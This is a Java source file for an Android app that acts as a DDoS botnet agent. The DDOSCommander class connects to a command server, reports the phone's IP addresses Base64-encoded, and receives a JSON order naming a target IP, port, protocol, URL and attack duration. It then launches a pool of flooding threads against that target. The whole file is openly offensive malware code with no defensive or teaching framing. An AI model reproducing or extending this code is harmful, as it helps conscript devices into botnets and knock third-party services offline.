package com.a.androidDDOS;

import android.content.Context;
import android.net.wifi.WifiManager;
import android.text.format.Formatter;
import android.util.Base64;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import static android.content.Context.WIFI_SERVICE;

public class DDOSCommander implements Runnable {

    private Context applicationContext;
    DDOSCommander(Context applicationContext) {
        this.applicationContext = applicationContext;
    }

    @Override
    public void run() {
        try {

//            ScheduledExecutorService exec = Executors.newSingleThreadScheduledExecutor();
//            exec.scheduleAtFixedRate(new DDOSCommander(applicationContext), 0, 5, TimeUnit.SECONDS);

            System.out.println("Run thread");

            Socket echoSocket = new Socket("10.0.2.2", 8888);
            PrintWriter out =
                    new PrintWriter(echoSocket.getOutputStream(), true);
            BufferedReader in =
                    new BufferedReader(
                            new InputStreamReader(echoSocket.getInputStream(), "UTF-8"));
            BufferedReader stdIn =
                    new BufferedReader(
                            new InputStreamReader(System.in));

            out.println(Base64.encodeToString((getIpV4Addr() + " " + getLocalIpAddress()).getBytes(), Base64.DEFAULT));
            String jsonFromSocket = in.readLine();

            JSONObject obj = new JSONObject(jsonFromSocket);


            String destinationIp = obj.getString("destinationIp");
            int duration = obj.getInt("duration");
            String method = obj.getString("method");
            String protocol = obj.getString("protocol");
            String port = obj.getString("port");
            String url = obj.getString("url");
            int threads = obj.getInt("threads");

            System.out.println("echo: " + obj.getString("destinationIp"));


            // create a pool of threads, 10 max jobs will execute in parallel
            ExecutorService threadPool = Executors.newFixedThreadPool(threads);
            // submit jobs to be executing by the pool
            for (int i = 0; i < threads; i++) {
                threadPool.submit(new DDOSThread(destinationIp, protocol, port, url, method));
            }

            // wait for the threads to finish if necessary
            threadPool.awaitTermination(duration, TimeUnit.SECONDS);

            echoSocket.close();
            out.close();
            in.close();
            stdIn.close();
            System.out.println("closed all resources");
        } catch (
                UnknownHostException e) {
            System.err.println("Don't know about host " + "10.0.2.2");
            System.exit(1);
        } catch (
                IOException e) {
            System.err.println("Couldn't get I/O for the connection to " +
                    "10.0.2.2");
            System.exit(1);
        } catch (JSONException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }




    private String getIpV4Addr() {
        WifiManager wm = (WifiManager) applicationContext.getSystemService(WIFI_SERVICE);
        return Formatter.formatIpAddress(wm.getConnectionInfo().getIpAddress());
    }

    public static String getLocalIpAddress() {
        try {
            for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements(); ) {
                NetworkInterface intf = en.nextElement();
                for (Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements(); ) {
                    InetAddress inetAddress = enumIpAddr.nextElement();
                    if (!inetAddress.isLoopbackAddress() && inetAddress instanceof Inet4Address) {
                        return inetAddress.getHostAddress();
                    }
                }
            }
        } catch (SocketException ex) {
            ex.printStackTrace();
        }
        return null;
    }
}
